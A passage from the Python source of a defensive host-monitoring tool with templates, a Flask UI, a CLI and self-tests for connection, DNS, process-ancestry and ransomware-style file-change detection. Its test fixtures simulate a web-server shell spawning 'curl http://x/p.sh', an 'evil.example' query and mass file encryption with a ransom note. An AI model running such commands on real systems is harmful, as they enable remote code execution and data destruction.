 not that a connection exists - it is that <b>this program has never talked to that place
 before</b>.<br><br>
 A connection is identified by program, remote address and port, deliberately <i>not</i> by
 local port, which is ephemeral and would make everything new every time.<br><br>
 <b>Misses:</b> anything opened and closed between two polls. Socket ownership needs
 privileges - without them some connections show no owner, which is a coverage limit, not
 evidence of hiding.</div>
<h2>2. Unexpected DNS queries</h2>
<div class="desc">Two separate questions. <b>Which resolvers</b> are being contacted comes
 from connection state and needs no privileges. <b>What names</b> are being asked for needs
 packet capture, which needs root - and when that is unavailable the report says the queries
 were not captured rather than implying there were none.<br><br>
 <b>The big blind spot:</b> DNS over HTTPS and DNS over TLS are invisible. They look like
 ordinary traffic to port 443, which is exactly why they exist. A browser using DoH shows no
 DNS queries here at all. That is a blind spot, not a clean result - so the tool reports when
 something resolves a known DoH provider, because that is the moment visibility is lost.</div>
<h2>3. Suspicious parent-child processes</h2>
<div class="desc">Not which programs run, but <b>who started them</b>. Every program here is
 legitimate: nothing about <span class="mono">bash</span> is suspicious, and
 <span class="mono">nginx</span> starting <span class="mono">bash</span> is the shape of
 remote code execution.<br><br>
 The check looks past the immediate parent. <span class="mono">curl</span> under
 <span class="mono">bash</span> is you typing;
 <span class="mono">curl &larr; bash &larr; nginx</span> is the whole attack - so an ordinary
 pair is escalated when something further up the chain should never have started it.<br><br>
 <b>Misses:</b> a process that runs and exits between polls leaves no trace at all.</div>
<h2>4. Rapid file modification</h2>
<div class="desc">Two snapshots of a tree, compared. Bursts of writes are what ransomware
 looks like from outside - and equally what a build, a backup, an unzip and a git checkout
 look like.<br><br>
 What separates them is the <b>pattern</b>, which is why the report shows the breakdown by
 directory and extension rather than just a number: a build concentrates its writes into
 predictable places, while encryption sweeps whatever it finds. A high <b>spread</b> - many
 directories, roughly one file each - is the shape of something walking a tree. Files
 appearing with encryption suffixes alongside that is the clearest signal there is.<br><br>
 <b>Misses:</b> a file created and deleted between snapshots is invisible.</div>
<h2>The baseline problem</h2>
<div class="banner warn">Everything here compares against what was seen before, so
 <b>the first run makes everything normal</b> - including anything already wrong with the
 machine. A baseline taken on a compromised host inherits the compromise. If you suspect a
 machine already, this tool tells you what changes from now on, not what is already
 there.</div>
{% endblock %}"""

LOGS_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Logs</h1><div class="sub">Stored locally in {{ dbfile }}.</div>
<div class="bar"><form method="get" style="display:flex;gap:8px;flex-wrap:wrap">
 <select name="level"><option value="">All levels</option>
  {% for l in ['INFO','WARN','ERROR'] %}<option value="{{ l }}" {{ 'selected' if l==f_level }}>
   {{ l }}</option>{% endfor %}</select>
 <input type="text" name="qq" value="{{ f_q }}" placeholder="search">
 <button class="btn" type="submit">Filter</button>
 <a class="btn" href="{{ url_for('page_logs') }}">Reset</a>
</form></div>
{% if rows %}
<table><tr><th>Time (UTC)</th><th>Level</th><th>Source</th><th>Message</th><th>Check</th></tr>
{% for e in rows %}<tr><td class="mono">{{ e.ts[:19].replace('T',' ') }}</td>
 <td class="mono lvl-{{ e.level }}"><b>{{ e.level }}</b></td>
 <td class="mono">{{ e.source }}</td><td>{{ e.message }}</td>
 <td class="mono">{{ ('#' ~ e.scan_id) if e.scan_id else '-' }}</td></tr>{% endfor %}</table>
{% else %}<div class="empty"><b>No log entries match</b></div>{% endif %}
{% endblock %}"""

TEMPLATES = {"base.html": BASE_TPL, "empty.html": EMPTY_TPL, "overview.html": OVERVIEW_TPL,
             "baseline.html": BASELINE_TPL, "scans.html": SCANS_TPL, "learn.html": LEARN_TPL,
             "logs.html": LOGS_TPL}

try:
    from flask import (Flask, Response, jsonify, redirect, render_template, request, url_for)
    from jinja2 import ChoiceLoader, DictLoader
    HAVE_FLASK = True
except Exception:  # pragma: no cover
    HAVE_FLASK = False


def build_app():
    if not HAVE_FLASK:
        raise SystemExit("Flask is not installed. Install it with:  pip install flask\n"
                         "(The CLI works without Flask; only the web app needs it.)")
    app = Flask(__name__)
    app.jinja_loader = ChoiceLoader([DictLoader(TEMPLATES), app.jinja_loader])

    def bandcol(score):
        return risk_band(score or 0)[1]

    def ctx(nav, **kw):
        base = {"nav": nav, "page": nav.capitalize(), "sev": SEV_COLOR,
                "severities": SEVERITIES, "ts_pretty": ts_pretty, "ago": ago,
                "detectors": DETECTORS, "bandcol": bandcol, "scan": None,
                "last_root": None, "error": request.args.get("error"),
                "flash": request.args.get("flash")}
        base.update(kw)
        return base

    @app.route("/")
    def page_overview():
        conn = connect()
        try:
            init_db(conn)
            try:
                sid = int(request.args.get("scan", "") or 0)
            except ValueError:
                sid = 0
            scan = scan_summary(sid, conn) if sid else None
            if not scan:
                sid = latest_scan_id(conn)
                scan = scan_summary(sid, conn) if sid else None
            last = q1("SELECT watch_root FROM scans WHERE watch_root IS NOT NULL "
                      "ORDER BY id DESC LIMIT 1", (), conn)
            if not scan:
                return render_template("empty.html", **ctx(
                    "overview", last_root=last["watch_root"] if last else None))
            p = report_payload(scan["id"], conn)
            payload = scan.get("payload") or {}
            det = request.args.get("detector", "").strip()
            findings = [f for f in p["findings"]
                        if not det or f["detector"] == det]
            counts = {s: scan[s] or 0 for s in SEVERITIES}
            return render_template("overview.html", **ctx(
                "overview", scan=scan, findings=findings, f_det=det,
                last_root=last["watch_root"] if last else None,
                lanes=svg_detectors(p["counts_by_detector"],
                                    payload.get("sources") or {}),
                tree=svg_tree(payload.get("ancestry") or []),
                pie=svg_pie([(s, counts[s], SEV_COLOR[s]) for s in SEVERITIES]),
                hist=svg_history(p["history"])))
        finally:
            conn.close()

    @app.post("/check")
    def do_check():
        import urllib.parse as up
        dets = request.form.getlist("detector") or list(DETECTORS)
        root = (request.form.get("watch_root") or "").strip() or None
        try:
            cap = clamp(float(request.form.get("capture_seconds", 0)), 0, 300)
        except ValueError:
            cap = 0.0
        if root and not os.path.isdir(root):
            return redirect(url_for("page_overview") + "?error="
                            + up.quote(f"'{root}' is not a directory on this machine"))
        try:
            res = run_check(detectors=[d for d in dets if d in DETECTORS],
                            watch_root=root, capture_seconds=cap,
                            note="from the web UI")
        except Exception as e:
            log_event("ERROR", "scan", str(e))
            return redirect(url_for("page_overview") + "?error=" + up.quote(str(e)))
        return redirect(url_for("page_overview") + f"?scan={res['id']}")

    @app.route("/baseline")
    def page_baseline():
        conn = connect()
        try:
            init_db(conn)
            kind = request.args.get("kind", "").strip()
            term = request.args.get("qq", "").strip()
            sql, args = "SELECT * FROM known WHERE 1=1", []
            if kind:
                sql += " AND kind=?"
                args.append(kind)
            if term:
                sql += " AND key LIKE ?"
                args.append(f"%{term}%")
            sql += " ORDER BY approved DESC, kind, key LIMIT 500"
            kinds = [r["kind"] for r in q("SELECT DISTINCT kind FROM known", (), conn)]
            return render_template("baseline.html", **ctx(
                "baseline", rows=q(sql, tuple(args), conn), kinds=kinds,
                f_kind=kind, f_q=term))
        finally:
            conn.close()

    @app.post("/approve")
    def do_approve():
        import urllib.parse as up
        kind = (request.form.get("kind") or "").strip()
        key = (request.form.get("key") or "").strip()
        ok, detail = approve(kind, key)
        return redirect(url_for("page_baseline") + "?flash="
                        + up.quote("Approved." if ok else detail))

    @app.post("/revoke")
    def do_revoke():
        kind = (request.form.get("kind") or "").strip()
        key = (request.form.get("key") or "").strip()
        if kind and key:
            revoke(kind, key)
        return redirect(url_for("page_baseline"))

    @app.route("/scans")
    def page_scans():
        conn = connect()
        try:
            init_db(conn)
            return render_template("scans.html", **ctx(
                "scans", rows=q("SELECT * FROM scans ORDER BY id DESC LIMIT 200",
                                (), conn)))
        finally:
            conn.close()

    @app.route("/learn")
    def page_learn():
        return render_template("learn.html", **ctx("learn"))

    @app.route("/logs")
    def page_logs():
        conn = connect()
        try:
            init_db(conn)
            level = request.args.get("level", "").strip().upper()
            term = request.args.get("qq", "").strip()
            sql, args = "SELECT * FROM audit_log WHERE 1=1", []
            if level in ("INFO", "WARN", "ERROR"):
                sql += " AND level=?"
                args.append(level)
            if term:
                sql += " AND (message LIKE ? OR source LIKE ?)"
                args += [f"%{term}%"] * 2
            sql += " ORDER BY id DESC LIMIT 300"
            return render_template("logs.html", **ctx(
                "logs", rows=q(sql, tuple(args), conn), f_level=level, f_q=term,
                dbfile=os.path.abspath(db_path())))
        finally:
            conn.close()

    @app.route("/export/<fmt>")
    def export(fmt):
        try:
            sid = int(request.args.get("scan", "") or 0) or None
        except ValueError:
            sid = None
        fmt = fmt.lower()
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        if fmt == "json":
            body, mime = export_json(sid), "application/json"
        elif fmt == "csv":
            body, mime = export_csv(sid), "text/csv"
        elif fmt == "html":
            body, mime = export_html(sid), "text/html"
        else:
            return Response("Unsupported format. Use json, csv or html.", 400,
                            mimetype="text/plain")
        log_event("INFO", "export", f"Exported the report as {fmt.upper()}", sid)
        return Response(body, mimetype=mime, headers={
            "Content-Disposition": f'attachment; filename="hostwatch-{stamp}.{fmt}"'})

    @app.route("/api/summary")
    def api_summary():
        sid = latest_scan_id()
        if not sid:
            return jsonify({"error": "no checks yet"}), 404
        s = scan_summary(sid)
        return jsonify({"tool": APP_NAME, "version": VERSION, "read_only": True,
                        "heuristics_not_verdicts": True,
                        "doh_is_invisible": True, "polls_so_misses_short_lived": True,
                        "disclaimer": DISCLAIMER_SHORT,
                        "scan": {k: v for k, v in s.items() if k != "payload"}})

    @app.errorhandler(404)
    def nf(_e):
        return Response("404 - page not found. Valid pages: / /baseline /scans /learn "
                        "/logs", 404, mimetype="text/plain")

    return app


def serve(host: str, port: int, debug: bool = False):
    app = build_app()
    init_db()
    log_event("INFO", "web", f"Web app started on http://{host}:{port}")
    print(f"\n  {APP_NAME} v{VERSION} - by {AUTHOR}")
    print(f"  {'-' * 66}")
    print(f"  Web app : http://{'127.0.0.1' if host == '0.0.0.0' else host}:{port}")
    print(f"  Database: {os.path.abspath(db_path())}")
    if not is_root():
        print("  NOTE    : not running as root. Socket ownership and DNS capture will\n"
              "            be limited - which is reported, not hidden.")
    if host == "0.0.0.0":
        print("  WARNING : bound to 0.0.0.0 - this UI exposes process names, command\n"
              "            lines and file paths from this machine. Use 127.0.0.1.")
    print(f"  {textwrap.fill(DISCLAIMER_SHORT, 66, subsequent_indent='  ')}")
    print(f"  {'-' * 66}\n  Press Ctrl+C to stop.\n")
    app.run(host=host, port=port, debug=debug, use_reloader=False)


# =============================================================================
# SECTION 11 - Command line interface
# =============================================================================

def line(char="-", n=78):
    print(char * n)


def banner():
    print(f"\n{APP_NAME} v{VERSION}  |  {AUTHOR}")
    line()
    print(textwrap.fill(DISCLAIMER_SHORT, 78))
    line()


def _print_findings(rows, limit=None, quiet=False, detector=None):
    shown = [f for f in rows
             if (not quiet or f["severity"] != "info")
             and (not detector or f["detector"] == detector)]
    shown = shown[:limit] if limit else shown
    for f in shown:
        print(f"\n  [{f['detector']:<11}] [{f['severity'].upper():^8}] {f['title']}")
        for l in textwrap.wrap(f["description"], 68):
            print(f"      {l}")
        if f.get("evidence"):
            for l in str(f["evidence"]).splitlines()[:10]:
                for w in textwrap.wrap(l, 68) or [""]:
                    print(f"      {w}")
        if f.get("advice"):
            for l in textwrap.wrap("what to make of it: " + f["advice"], 68):
                print(f"      {l}")


def _report(res, a):
    print(f"Host   : {socket.gethostname()}")
    print(f"Ran    : {', '.join(res['detectors'])}")
    if res.get("watch_root"):
        print(f"Watched: {res['watch_root']} over {res['window']:.0f}s")
    print(f"Time   : {res['elapsed_ms']} ms")
    line("=")
    print(f"  SCORE {res['score']}   -   {res['band'].upper()}")
    line("=")
    for det in res["detectors"]:
        src = (res.get("sources") or {}).get(det) or {}
        hits = [f for f in res["findings"] if f["detector"] == det]
        worst = next((s for s in SEVERITIES
                      if any(f["severity"] == s for f in hits)), "info")
        if src.get("status") == "unavailable":
            state = "DID NOT RUN"
        elif worst == "info":
            state = "ran, nothing notable"
        else:
            state = f"{worst.upper()} - {len([f for f in hits if f['severity'] != 'info'])} finding(s)"
        print(f"  {det:<13} {state}")
        if src.get("detail"):
            for l in textwrap.wrap(src["detail"], 60):
                print(f"                {l}")
    line()
    _print_findings(res["findings"], a.show, a.quiet, a.only)
    line()
    print(textwrap.fill("  " + HEURISTIC_NOT_VERDICT, 78))
    line()


def _selected(a) -> list[str]:
    if a.only:
        return [a.only]
    chosen = [d for d in DETECTORS if not getattr(a, f"no_{d}", False)]
    return chosen or list(DETECTORS)


def cmd_check(a):
    banner()
    if not is_root():
        print("NOTE: not running as root. Socket ownership and DNS capture are limited -")
        print("      the report says so rather than quietly showing less.\n")
    res = run_check(detectors=_selected(a), watch_root=a.watch_root,
                    window=a.window, capture_seconds=a.capture_seconds,
                    max_files=a.max_files, file_threshold=a.file_threshold,
                    note=a.note or "")
    _report(res, a)
    return _exit_code(a, res)


def cmd_watch(a):
    banner()
    print(f"Checking every {a.interval:.0f}s"
          + (f", {a.count} times" if a.count else " until Ctrl+C") + ".")
    print("Only findings above informational are printed.\n")
    n = 0
    try:
        while True:
            n += 1
            res = run_check(detectors=_selected(a), watch_root=a.watch_root,
                            window=a.window, capture_seconds=a.capture_seconds,
                            max_files=a.max_files, file_threshold=a.file_threshold,
                            note="watch", mode="watch")
            stamp = datetime.now().strftime("%H:%M:%S")
            alerts = [f for f in res["findings"] if f["severity"] != "info"]
            if alerts:
                print(f"  {stamp}  #{res['id']}  score {res['score']}")
                for f in alerts:
                    mark = "!!" if f["severity"] in ("critical", "high") else "  "
                    print(f"   {mark} [{f['detector']:<11}] "
                          f"[{f['severity'].upper():^8}] {f['title']}")
            elif not a.quiet:
                print(f"  {stamp}  #{res['id']}  nothing notable")
            if a.count and n >= a.count:
                break
            time.sleep(max(0.0, a.interval - a.window))
    except KeyboardInterrupt:
        print("\nStopped.")
    line()
    print(f"  {n} check(s) recorded.")
    print(textwrap.fill("  " + POLLING_LIMIT, 78))
    line()
    return 0


def _exit_code(a, res):
    counts = res["counts"]
    if a.fail_on_critical and counts["critical"]:
        print(f"  Exiting non-zero: {counts['critical']} critical finding(s).")
        return 2
    if a.fail_over is not None and res["score"] > a.fail_over:
        print(f"  Exiting non-zero: score {res['score']} is above --fail-over "
              f"{a.fail_over}")
        return 2
    return 0


def cmd_baseline(a):
    sql, args = "SELECT * FROM known WHERE 1=1", []
    if a.kind:
        sql += " AND kind=?"
        args.append(a.kind)
    sql += " ORDER BY approved DESC, kind, key LIMIT ?"
    args.append(a.limit)
    rows = q(sql, tuple(args))
    if not rows:
        print("Nothing recorded yet. Run:  check")
        return 0
    print(f"  {'KIND':<11} {'SEEN':>5}  {'APPROVED':<9} KEY")
    line()
    for r in rows:
        print(f"  {r['kind']:<11} {r['times_seen']:>5}  "
              f"{('yes' if r['approved'] else 'no'):<9} {shorten(r['key'], 44)}")
    line()
    print(f"  {len(rows)} entry(ies). Approve something with:  approve KIND KEY")
    line()
    return 0


def cmd_approve(a):
    ok, detail = approve(a.kind, a.key, a.label or "")
    if not ok:
        print(detail)
        return 1
    print(f"Approved {a.kind}: {detail}")
    print()
    print(textwrap.fill(
        "It will no longer be reported as new or unusual. Approving does not stop it being "
        "tracked - it is still recorded, just not flagged.", 78))
    return 0


def cmd_revoke(a):
    n = revoke(a.kind, a.key)
    print(f"Revoked {n} approval(s)." if n else f"'{a.key}' was not approved.")
    return 0


def cmd_learn(_a):
    banner()
    print(textwrap.dedent("""\
        NONE OF THESE FOUR THINGS IS INHERENTLY BAD

          A new connection is what happens the first time you use a program. A
          query to a public resolver may be your own configuration. Build systems
          and service managers spawn shells constantly. A compile, a backup or an
          unzip modifies thousands of files in seconds.

          What makes any of them interesting is context this tool does not have.
          It reports what is unusual against what it has seen before and explains
          why the pattern matters. Deciding whether it is actually wrong is yours.

        1. NEW NETWORK CONNECTIONS

          Every outbound connection, matched to the process that owns it via
          /proc/net and /proc/*/fd. The signal is not that a connection exists -
          it is that THIS PROGRAM has never talked to THAT PLACE before.

          A connection is identified by program, remote address and port -
          deliberately not by local port, which is ephemeral and would make
          everything new every time.

          Misses: anything opened and closed between two polls. Socket ownership
          needs privileges; without them some connections show no owner, which is
          a coverage limit and not evidence of hiding.

        2. UNEXPECTED DNS QUERIES

          Two separate questions. WHICH RESOLVERS are being contacted comes from
          connection state and needs no privileges. WHAT NAMES are asked for needs
          packet capture, which needs root - and without it the report says the
          queries were not captured rather than implying there were none.

          THE BIG BLIND SPOT: DNS over HTTPS and DNS over TLS are invisible. They
          look like ordinary traffic to port 443, which is exactly why they exist.
          A browser using DoH shows no DNS queries here at all. That is a blind
          spot, not a clean result - so the tool reports when something resolves a
          known DoH provider, because that is the moment visibility is lost.

        3. SUSPICIOUS PARENT-CHILD PROCESSES

          Not which programs run, but WHO STARTED THEM. Every program involved is
          legitimate: nothing about bash is suspicious, and nginx starting bash is
          the shape of remote code execution.

          The check looks past the immediate parent. curl under bash is you
          typing; curl <- bash <- nginx is the whole attack. So an ordinary pair
          gets escalated when something further up the chain should never have
          started it.

          Misses: a process that runs and exits between polls leaves no trace.

        4. RAPID FILE MODIFICATION

          Two snapshots of a tree, compared. Bursts of writes are what ransomware
          looks like from outside - and equally what a build, a backup, an unzip
          and a git checkout look like.

          What separates them is the PATTERN, which is why the report breaks the
          changes down by directory and extension rather than giving a number. A
          build concentrates its writes into predictable places; encryption sweeps
          whatever it finds. A high spread - many directories, roughly one file
          each - is the shape of something walking a tree.

          Misses: a file created and deleted between snapshots is invisible.

        THE BASELINE PROBLEM

          Everything here compares against what was seen before, so THE FIRST RUN
          MAKES EVERYTHING NORMAL - including anything already wrong with the
          machine. A baseline taken on a compromised host inherits the compromise.
          If you already suspect a machine, this tells you what changes from now
          on, not what is already there.
        """))
    line()


def cmd_scans(a):
    rows = q("SELECT * FROM scans ORDER BY id DESC LIMIT ?", (a.limit,))
    if not rows:
        print("Nothing checked yet.")
        return 0
    print(f"{'ID':>4}  {'WHEN (UTC)':<20} {'SCORE':>6} {'CONNS':>6} {'FILES':>6}  VERDICT")
    line()
    for r in rows:
        print(f"{r['id']:>4}  {r['ts'][:19].replace('T', ' '):<20} {r['score']:>6} "
              f"{r['connections']:>6} {r['files_touched']:>6}  {r['band'] or ''}")
    return 0


def cmd_export(a):
    sid = a.scan or latest_scan_id()
    if not sid:
        print("Nothing to export yet.")
        return 1
    fmt = a.format.lower()
    body = {"json": export_json, "csv": export_csv, "html": export_html}[fmt](sid)
    out = a.out or f"hostwatch-{datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')}.{fmt}"
    with open(out, "w", encoding="utf-8") as fh:
        fh.write(body)
    log_event("INFO", "export", f"Exported check #{sid} as {fmt.upper()} to {out}", sid)
    print(f"Wrote {out} ({len(body):,} bytes)")
    print("It lists process names, command lines and file paths - treat it as sensitive.")
    return 0


def cmd_logs(a):
    sql, args = "SELECT * FROM audit_log WHERE 1=1", []
    if a.level:
        sql += " AND level=?"
        args.append(a.level.upper())
    sql += " ORDER BY id DESC LIMIT ?"
    args.append(a.limit)
    rows = q(sql, tuple(args))
    if not rows:
        print("No log entries.")
        return 0
    for e in reversed(rows):
        print(f"{e['ts'][:19].replace('T', ' ')}  {e['level']:<5} {e['source']:<12} "
              f"{e['message']}")
    return 0


def cmd_purge(a):
    conn = connect()
    try:
        if a.all:
            for t in ("findings", "scans", "audit_log"):
                conn.execute(f"DELETE FROM {t}")
            if a.baseline:
                conn.execute("DELETE FROM known")
            conn.commit()
            print("All checks, findings and logs deleted."
                  + (" The baseline was cleared too." if a.baseline
                     else " The baseline was kept."))
            return 0
        rows = q("SELECT id FROM scans ORDER BY id DESC", (), conn)
        drop = [r["id"] for r in rows[a.keep:]]
        for sid in drop:
            conn.execute("DELETE FROM findings WHERE scan_id=?", (sid,))
            conn.execute("DELETE FROM scans WHERE id=?", (sid,))
        conn.commit()
        print(f"Purged {len(drop)} check(s); kept the newest {a.keep}.")
        return 0
    finally:
        conn.close()


def cmd_serve(a):
    serve(a.host, a.port, a.debug)


def cmd_version(_a):
    banner()
    print(f"  Python     : {platform.python_version()} ({sys.platform})")
    print(f"  Flask      : {'yes' if HAVE_FLASK else 'NOT INSTALLED - web app unavailable'}")
    print(f"  Privileges : {'root' if is_root() else 'unprivileged'}")
    conns = read_connections()
    print(f"  Connections: {conns.status}"
          + (f", owner coverage {conns.data['owner_coverage']}%" if conns.data else ""))
    procs = read_processes()
    print(f"  Processes  : {procs.status}"
          + (f", {procs.data['count']} visible" if procs.data else ""))
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        s.close()
        cap = "available"
    except Exception as e:
        cap = f"unavailable ({type(e).__name__}) - DNS query names cannot be captured"
    print(f"  DNS capture: {cap}")
    print(f"  Resolvers  : {', '.join(configured_resolvers()['resolvers']) or 'unknown'}")
    print(f"  Rules      : {len(ANCESTRY_RULES)} ancestry rules, "
          f"{len(SUSPICIOUS_EXTENSIONS)} encryption suffixes")
    print(f"  Database   : {os.path.abspath(db_path())}")
    print(f"  GitHub     : {GITHUB}")
    line()
    print(DISCLAIMER_LONG)
    line()


# =============================================================================
# SECTION 12 - Self test
# =============================================================================

def cmd_selftest(_a=None) -> int:
    import tempfile
    passed, failed, skipped = [], [], []

    def check(name, cond, detail=""):
        (passed if cond else failed).append(name)
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}"
              f"{'  <- ' + str(detail) if detail and not cond else ''}")

    def skip(name, why):
        skipped.append(name)
        print(f"  [SKIP] {name}  ({why})")

    banner()
    print("SELF TEST - four detectors, against fixtures and against this machine.\n")
    original = db_path()
    tmp = tempfile.mkdtemp(prefix="hostwatch-selftest-")
    set_db_path(os.path.join(tmp, "selftest.db"))
    try:
        print(" Address decoding")
        ip, port = _decode_addr("0100007F:1F90")
        check("a little-endian IPv4 address decodes",
              ip == "127.0.0.1" and port == 8080, (ip, port))
        ip, port = _decode_addr("00000000:0050")
        check("the wildcard address decodes", ip == "0.0.0.0" and port == 80)
        check("state codes are named", TCP_STATES["0A"] == "LISTEN")

        print("\n DETECTOR 1 - connections")
        conns = read_connections()
        check(f"connections are read ({conns.status})",
              conns.status in ("ok", "partial", "unavailable"))
        if conns.data:
            check("every connection has a remote address and port",
                  all(c["remote_ip"] and c["remote_port"]
                      for c in conns.data["connections"]))
            check("every connection is classified",
                  all(c["remote_class"] in ("public", "private", "loopback",
                                            "link-local", "multicast", "unknown")
                      for c in conns.data["connections"]))
            check("owner coverage is reported as a number",
                  isinstance(conns.data["owner_coverage"], float))
        c1 = {"exe": "/usr/bin/curl", "process": "curl", "remote_ip": "1.2.3.4",
              "remote_port": 443, "proto": "tcp"}
        c2 = dict(c1)
        check("the same program to the same place is the same connection",
              connection_key(c1) == connection_key(c2))
        check("a different port makes it a different connection",
              connection_key(c1) != connection_key({**c1, "remote_port": 80}))
        check("the local port is NOT part of the identity",
              connection_key({**c1, "local_port": 5555})
              == connection_key({**c1, "local_port": 6666}),
              "otherwise every connection would be new every time")
        check("a public address is classified as public",
              classify_remote("8.8.8.8") == "public")
        check("a private address is classified as private",
              classify_remote("192.168.1.1") == "private")
        check("loopback is classified as loopback",
              classify_remote("127.0.0.1") == "loopback")
        rows = [{"key": "k1", "remote_ip": "8.8.8.8", "remote_port": 4444,
                 "proto": "tcp", "state": "ESTABLISHED", "remote_class": "public",
                 "process": "weird", "pid": 1, "port_note": NOTABLE_PORTS[4444]}]
        src = Result("connections")
        src.data = {"connections": rows, "listening": [], "owner_coverage": 100.0}
        f = analyse_connections(src, {"other": {}}, {"resolvers": []})
        check("a new connection is reported",
              any("not seen before" in x["title"] for x in f), [x["title"] for x in f])
        check("a notable port is named and explained",
              any("4444" in x["title"] and x["severity"] == "high" for x in f),
              [x["title"] for x in f])
        f = analyse_connections(src, {}, {"resolvers": []})
        check("the first run reports a baseline rather than alarming",
              any("First run" in x["title"] for x in f)
              and not any(x["severity"] in ("critical", "high") for x in f),
              [x["title"] for x in f])
        check("and warns the baseline inherits anything already wrong",
              any("inherits that" in x.get("advice", "") for x in f))

        print("\n DETECTOR 2 - DNS")
        query = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) \
            + b"\x07example\x03com\x00" + struct.pack("!HH", 1, 1)
        parsed = parse_dns_query(query)
        check("a DNS query parses", parsed and parsed["qname"] == "example.com", parsed)
        check("the query type is named", parsed["qtype"] == "A")
        check("a query is distinguished from a response", not parsed["is_response"])
        resp = struct.pack("!HHHHHH", 0x1234, 0x8180, 1, 1, 0, 0) \
            + b"\x07example\x03com\x00" + struct.pack("!HH", 1, 1)
        check("a response is identified", parse_dns_query(resp)["is_response"])
        check("garbage is rejected", parse_dns_query(b"nonsense") is None)
        check("a truncated message is rejected", parse_dns_query(b"\x00" * 5) is None)
        aaaa = struct.pack("!HHHHHH", 1, 0x0100, 1, 0, 0, 0) \
            + b"\x04mail\x06google\x03com\x00" + struct.pack("!HH", 28, 1)
        p2 = parse_dns_query(aaaa)
        check("a multi-label name decodes",
              p2["qname"] == "mail.google.com" and p2["qtype"] == "AAAA", p2)
        res = configured_resolvers()
        check("configured resolvers are read", isinstance(res["resolvers"], list))
        cap = Result("dns_capture").unavailable("capture needs root")
        f = analyse_dns(cap, [], {"resolvers": ["192.168.1.1"], "source": "test"}, {})
        check("a skipped capture says query names were NOT captured",
              any("NOT captured" in x["title"] for x in f), [x["title"] for x in f])
        check("and the DoH blind spot is stated",
              any("DNS over HTTPS" in x.get("advice", "") for x in f))
        dns_conns = [{"remote_ip": "8.8.8.8", "remote_port": 53, "process": "curl",
                      "key": "x"}]
        f = analyse_dns(cap, dns_conns, {"resolvers": ["192.168.1.1"], "source": "t"}, {})
        check("a resolver that is not configured is reported HIGH",
              any(x["severity"] == "high" and "not configured" in x["title"] for x in f),
              [x["title"] for x in f])
        cap2 = Result("dns_capture")
        cap2.data = {"seconds": 10, "packets": 5, "queries": [
            {"qname": "dns.google", "qtype": "A", "is_response": False},
            {"qname": "x" * 50 + ".evil.example", "qtype": "A", "is_response": False},
            {"qname": "abc.ngrok.io", "qtype": "A", "is_response": False}]}
        f = analyse_dns(cap2, [], {"resolvers": []}, {})
        check("a DoH provider being resolved is reported",
              any("DNS-over-HTTPS" in x["title"] for x in f), [x["title"] for x in f])
        check("a very long label is reported",
              any("long first label" in x["title"] for x in f))
        check("a tunnelling provider is reported",
              any("tunnelling" in x["title"] for x in f))

        print("\n DETECTOR 3 - process ancestry")
        procs = read_processes()
        check(f"processes are read ({procs.status})",
              procs.status in ("ok", "partial", "unavailable"))
        if procs.data:
            check("a real machine produces no critical ancestry findings",
                  not any(h["severity"] == "critical"
                          for h in analyse_ancestry(procs.data["processes"])),
                  [h["label"] for h in analyse_ancestry(procs.data["processes"])])
        attack = {
            100: {"pid": 100, "name": "nginx", "ppid": 1, "cmdline": "nginx: worker",
                  "user": "www-data"},
            200: {"pid": 200, "name": "bash", "ppid": 100, "cmdline": "bash -i",
                  "user": "www-data"},
            300: {"pid": 300, "name": "curl", "ppid": 200,
                  "cmdline": "curl http://x/p.sh", "user": "www-data"}}
        hits = analyse_ancestry(attack)
        check("a server starting a shell is CRITICAL",
              any(h["severity"] == "critical" and h["child"] == "bash" for h in hits),
              [(h["parent"], h["child"], h["severity"]) for h in hits])
        deep = [h for h in hits if h["child"] == "curl"]
        check("a downloader under a shell under a server is ALSO caught",
              deep and deep[0]["severity"] == "critical",
              "the full chain is the whole point")
        check("and the chain is shown in full",
              deep and "nginx" in deep[0]["chain"], deep[0]["chain"] if deep else None)
        normal = {10: {"pid": 10, "name": "systemd", "ppid": 1},
                  20: {"pid": 20, "name": "bash", "ppid": 10, "user": "me"},
                  30: {"pid": 30, "name": "curl", "ppid": 20, "user": "me"}}
        check("you typing curl in a terminal raises nothing",
              not analyse_ancestry(normal),
              [h["label"] for h in analyse_ancestry(normal)])
        doc = {50: {"pid": 50, "name": "soffice", "ppid": 1},
               60: {"pid": 60, "name": "python3", "ppid": 50, "cmdline": "python3 -c ..."}}
        check("a document application starting an interpreter is CRITICAL",
              any(h["severity"] == "critical" for h in analyse_ancestry(doc)),
              [h["label"] for h in analyse_ancestry(doc)])
        check("version suffixes are matched", _matches("python3.12", INTERPRETERS))
        check("an unrelated name is not matched", not _matches("myprogram", SHELLS))
        check("tainted_ancestor finds a server three levels up",
              tainted_ancestor(attack, 300) == "nginx")
        check("and finds nothing in an ordinary chain",
              tainted_ancestor(normal, 30) is None)

        print("\n DETECTOR 4 - file changes")
        d = os.path.join(tmp, "files")
        os.makedirs(d)
        for i in range(30):
            with open(os.path.join(d, f"doc{i}.txt"), "w") as fh:
                fh.write("original")
        before = scan_tree(d)
        check("a tree scan finds the files", before.data["scanned"] == 30,
              before.data["scanned"])
        after_same = scan_tree(d)
        diff = diff_trees(before.data, after_same.data, 5.0)
        check("an unchanged tree produces no changes", diff["touched"] == 0, diff["touched"])
        f = analyse_files(diff, summarise_changes(diff), d, 20.0)
        check("and that is reported as nothing changed",
              any("No files changed" in x["title"] for x in f))
        time.sleep(0.05)
        for i in range(30):
            with open(os.path.join(d, f"doc{i}.txt.encrypted"), "w") as fh:
                fh.write("encrypted payload much longer than before")
            os.remove(os.path.join(d, f"doc{i}.txt"))
        with open(os.path.join(d, "HOW_TO_DECRYPT.txt"), "w") as fh:
            fh.write("pay us")
        after = scan_tree(d)
        diff = diff_trees(before.data, after.data, 2.0)
        summary = summarise_changes(diff)
        check("created files are detected", len(diff["created"]) == 31,
              len(diff["created"]))
        check("deleted files are detected", len(diff["deleted"]) == 30,
              len(diff["deleted"]))
        check("the rate is computed", diff["rate"] > 20, diff["rate"])
        check("encryption suffixes are recognised",
              len(diff["renamed_suspicious"]) == 30, len(diff["renamed_suspicious"]))
        check("a ransom note is recognised", len(diff["notes"]) == 1, diff["notes"])
